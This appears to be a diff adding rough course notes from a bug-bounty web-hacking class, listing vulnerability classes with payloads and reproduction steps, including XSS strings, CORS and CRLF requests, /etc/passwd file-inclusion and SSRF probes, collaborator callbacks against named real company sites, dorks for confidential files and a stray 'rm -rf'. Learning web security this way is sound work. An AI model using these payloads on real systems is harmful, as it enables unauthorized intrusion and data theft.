@@ -1,0 +1,492 @@
+Batch 8  
+
+Day1 : Introductory Session
+
+Thrusday to sunday 
+
+4 txt
+
+
+##COMPLETED BUGS
+RECON 
+HTML INJECTION 
+HYPERLINK
+XSS 
+EXIF 
+Sensetive Information Disclosure
+CORS
+FILE INLCUSION
+IDOR
+CRLF
+SSTI
+TAKEOVER
+BUSINESS LOGIC
+BLING SSRF
+BYPASSES
+HHI
+OAUTH
+Pre/ATO
+JIRA 
+dos
+Buss lOgic  
+
+
+
+
+Rem:
+CSRF
+cache 
+sqli
+SSRF part 2
+RCE 1/2
+Automations
+Functionaity based bugs
+
+
+
+
+
+#Day 5 
+
+*required softwares
+*extension = foxyproxy, wappylyser, cookie editor, hackbar
+*burpsuite 1.7x
+*wsl && kali (virtual/dual boot)
+
+virtual = i5 8gb or more (barely run) 16gb ram(smoothly)
+
+dual boot = i3 / i5 
+*backup
+*create a partition
+*100gb
+*create a bootble
+follow process
+
+
+
+thecyberboy.com
+
+
+web methods: GET POST DELETE PUT OPTIONS
+
+PUT /malicious-code.html HTTP/1.1
+Host: thecyberboy.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+
+rm -rf
+
+
+
+Spidering:
+
+
+
+GET /search?q=1111&form=QBLH&sp=-1&pq=1111&sc=10-4&qs=n&sk=&cvid=54E3A9D4772649E483ABDAAF87A15249&ghsh=0&ghacc=0&ghpl= HTTP/1.1
+Host: www.bing.com
+
+
+
+
+http;//evil.com/admin/getdata?id=1237     >>b
+
+<img src=x onerror=alert('Kar diya xss dosto');>
+<img src=https://c8.alamy.com/comp/G3GBTB/vector-illustration-of-cartoon-lady-bug-G3GBTB.jpg>
+
+
+
+collaborator everywhere
+logger++
+j2ee scan
+CSRF scanner
+
+
+1 BUG  1 CLASS 
+
+HTML INJECTION : html inject 
+
+parameter : input parameter/ name lastname description bio compnay name your role whatever........
+
+name : <img src=http://bugphotolink>
+search : one time 
+Email : account > company/dashboard/group > invite via email.com > email hello xyz you are invited to  a <bugphotolink>
+
+
+<h1>bgtexts</h1>
+<img src=https://c8.alamy.com/comp/G3GBTB/vector-illustration-of-cartoon-lady-bug-G3GBTB.jpg>
+<img src=http://tiny.cc/hti3vz>
+<img src=x onerror=alert('Kar diya xss dosto');>
+
+input method = block/error/forbidden
+
+
+
+##RECON
+
+
+
+HYPERLINK INJECTION:
+parameter : input parameter/ name lastname description bio compnay name your role whatever........
+
+http://evil.com > name p
+
+invite section: email@mail.com
+
+hackerone
+http://evil.com has invited you to join xyz
+
+
+Open Redirect from hyperlink injection to malicious website.
+Normal user will think he got a mail from target.com but as we know function dont have security to verify invite. So it will harm multiple users on behalf of targent.com
+
+
+Steps to Reproduce:
+Hyperlink Injection : { Image attached }
+1. sign up  and fill your project name as link [ evil.com ]
+2. navigate to invite users
+3. invite team members
+4. enter mail and invite people and you will see that there is a hyperlink injection in the mail [ screenshot attached ]
+
+
+EXIF Metadata  :  its a data in  a image
+
+xyz.com > profile > profile-photo > upload > download 
+
+
+SENSETIVE_INFOR_DISCLOSURE :
+
+1. DORking 
+inurl:rippling.com | confidential | “employee only” | proprietary | top secret | classified | trade secret | internal | private filetype:pdf
+2. Gitrecon
+3. WAYback and other resources >> (.sql .js .php .extensionss (parameter=gf-tool) .pdf .txt .ppt ) 
+4. FUzzing  >> 
+
+
+
+CORS: cross origin resource sharing
+
+
+origin : tcb.com
+
+resp
+
+
+
+
+
+
+
+
+
+
+  REQUEST
+
+ PUT /malicious-code.html HTTP/1.1
+Host:zoho.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Origin: evil.com
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+
+
+
+
+RESPONSE
+
+HTTP/1.1 200 
+Server: ZGS
+Date: Sun, 11 Dec 2022 14:08:41 GMT
+Content-Type: application/json;charset=UTF-8
+Content-Length: 546
+Connection: close
+X-Content-Type-Options: nosniff
+X-XSS-Protection: 1
+X-Frame-Options: SAMEORIGIN
+Access-Control-Allow-Origin: evil.com
+Vary: Origin
+Access-Control-Allow-Credentials: true
+Access-Control-Allow-Methods: POST
+Access-Control-Allow-Headers: Content-Type,Z-Authorization
+Location: https://accounts.zoho.in/webclient/v1/register/otp/verify
+P3P: CP="CAO PSA OUR"
+Set-Cookie: dcl_pfx=in; Domain=zoho.in; Path=/
+Set-Cookie: dcl_bd=zoho.in; Domain=zoho.in; Path=/; HttpOnly
+Set-Cookie: is_pfx=false; Domain=zoho.in; Path=/; HttpOnly
+Set-Cookie: PaymentsReferral=; Max-Age=0; Expires=Thu, 01-Jan-1970 00:00:10 GMT; Domain=accounts.zoho.in; Path=/
+Set-Cookie: PaymentsReferral=; Max-Age=0; Expires=Thu, 01-Jan-1970 00:00:10 GMT; Domain=zoho.in; Path=/
+Set-Cookie: PaymentsReferral=; Max-Age=0; Expires=Thu, 01-Jan-1970 00:00:10 GMT; Path=/
+Content-Disposition: attachment;filename*="SignUpOTPVerify.json"
+X-Download-Options: noopen
+Strict-Transport-Security: max-age=63072000
+
+
+
+
+https://app.achievable.me/study/achievable/catalog
+
+
+
+GET /study/achievable/catalog HTTP/1.1
+Host: app.achievable.me
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Origin: bing.com
+Cookie: _ga_95D0CW0D8Q=GS1.2.1674839461.1.0.1674839462.0.0.0; _ga=GA1.2.480896910.1674839462
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+If-Modified-Since: Fri, 27 Jan 2023 00:57:12 GMTG
+
+
+
+
+HTTP/1.1 200 OK
+Date: Fri, 27 Jan 2023 17:12:16 GMT
+Content-Type: text/html; charset=utf-8
+Connection: close
+Server: nginx/1.20.0
+Vary: Origin
+Access-Control-Allow-Origin: bing.com
+Access-Control-Allow-Credentials: true
+Last-Modified: Fri, 27 Jan 2023 00:57:12 GMT
+Cache-Control: max-age=0
+Content-Length: 9276
+
+
+https://app.achievable.me/study/achievable/catalog
+
+
+
+Impact
+1) In this report I want to describe High-level bug which can seriously compromise a user account.If I am authorized on this site, I can steal user's sessions, some personal information, or do some action.
+2) Attacker would treat many victims to visit attacker's website, if the victim is logged in, then his personal information is recorded in attacker's server.
+3) Also If the site specifies the header Access-Control-Allow-Credentials: true, third-party sites may be able to carry out privileged actions and retrieve sensitive information.
+
+Remediation:
+Rather than using a wildcard or programmatically verifying supplied origins, use a whitelist of trusted domains
+
+
+
+
+XSS:
+1. Sanitization / bypass = error, not executing
+
+<script>alert(1)</script>
+
+text<""><script>alert(1)</script>
+
+
+
+
+DOM BASED:
+
+1. attacker sent you a malicious code
+2. clicked on it and sent  a reqest to web server 
+3. response came back normal {no malicious code in it}
+4. code executes
+
+
+
+2020 3580
+
+Payload: SAMLResponse="><svg/onload=alert("XSS")>
+
+
+Steps To Reproduce:
+1. Navigate to this url https://vcs-e.cclan.telekom.net/+CSCOE+/saml/sp/acs?tgname=a
+2. capture Request and send to repeater
+3. change request Method GET To Post
+4. You have to add ?tgname=a
+5. Add this payload: SAMLResponse="><svg/onload=alert("XSS")>
+same vulnerability is on two more domains:
+
+
+<img src=x> http://evil.com {{7*7}}
+
+
+
+
+FILE INCLUSION
+
+2 types 
+Local File Inclusion (LFI). server internally
+-
+ḥttp://victim.com/include.php?page=profile.jpg
+
+root/home/website/url/server/profile_photo/profile.jpg
+/etc/passwd
+
+> choose > spider it / find parameter using tools > get all the lfi possible parameter > bruteforce > fuzz
+
+
+CVE BASED LFI
+
+
+Remote File Inclusion (RFI). files from internet\
+
+ḥttp://victim.com/include.php?page=http://google.com
+
+
+
+
+https://picker.swiggy.com/_next/static/../server/pages-manifest.json 
+
+
+
+SSTI  = Server side template injecttion
+
+
+http://vulnerable-website.com/?name=hacker{{2*2}}
+
+name=
+
+
+SSTI vulnerabilities are usually scored with high severity given their propensity to end in full remote code execution. A malicious actor executing a successful SSTI attack could gain complete access to the application server by executing code in the template engine context and escaping the sandbox. This could lead to the complete compromise of the server, the application, and the underlying operating system.
+
+
+CRLF =  Carriage Return and line feed 
+
+http://www.sanoma.com/%E5%98%8D%E5%98%8ASet-Cookie:crlfinjection=crlfinjection
+
+
+CRLFFUZZ
+
+
+BLIND SSRF:
+
+
+
+
+http://toolkit.aliyun.com/composer/send_email?to=oRQY@aJJR&url=http://c4hh20zl3ylmqadk27bll1qhv81zppde.oastify.com
+
+
+
+1. Navigate to https://bin.readme.com/?paytm_action=curltest&url=http://c4hh20zl3ylmqadk27bll1qhv81zppde.oastify.com
+
+2. Enter burp collaborator link there and you will see the pingback and its not my ip
+
+
+c4hh20zl3ylmqadk27bll1qhv81zppde.oastify.com
+
+
+8.134.127.10
+
+
+1. navigate to the url were the image is called ( https://experts.10web.io/cdn-cgi/image/width/<COLLABORATOR HERE> )
+
+
+ https://login.brand-dialog.telekom.com/auth/realms/master/protocol/openid-connect/auth?scope=openid&response_type=code&redirect_uri=valid&state=cfx&nonce=cfx&client_id=security-admin-console&request_uri=<url here>
+
+
+ email = something@collablink.com
+
+
+
+
+ HOST HEADER INJECTION ATTACK  = 
+
+
+
+GET /study/achievable/catalog HTTP/1.1
+Host: app.achievable.me
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Origin: bing.com
+Cookie: _ga_95D0CW0D8Q=GS1.2.1674839461.1.0.1674839462.0.0.0; _ga=GA1.2.480896910.1674839462
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+If-Modified-Since: Fri, 27 Jan 2023 00:57:12 GMTG
+
+
+
+
+
+
+
+
+
+PRE ATO 
+
+zizooboats.com
+Steps to Reproduce:
+1. Signup a account using a email address and password
+2. now logout and signup again using the same email address with Oauth
+3. and you can see that you are still able to login using the email and password
+
+
+Description:
+basically what it means is that someone can register using the unregistered victims account. after that victim will log in using the OAuth. in this case, the verification process is bypassed and the attacker can log in using the password after that.
+
+
+xyz.com > signup > email&password > verifition/homepage > accountcerted/verifired
+
+xyz.com > signup {same email} > OAuth > {already_userd/Pending_verification} > account created 
+
+login > email&password > 
+
+
+ATO
+
+
+
+
+
+JIRA.URL.COM
+https://jira.grab.com/plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000&cyclePeriod=alert(document.domain)
+
+
+
+BUG {backend} 
+ssrf > source=file:///etc/passwd
+
+
+ https://code.microsoft.com/wp-content/plugins/wechat-broadcast/wechat/Image.php?url=
+
+
+
+ ../../../../../../../../../../etc/passwd
+
+
+
+
+ha' 
+
+domain.com/
+
+
+
+
+
+
+
+
+
+
+
+
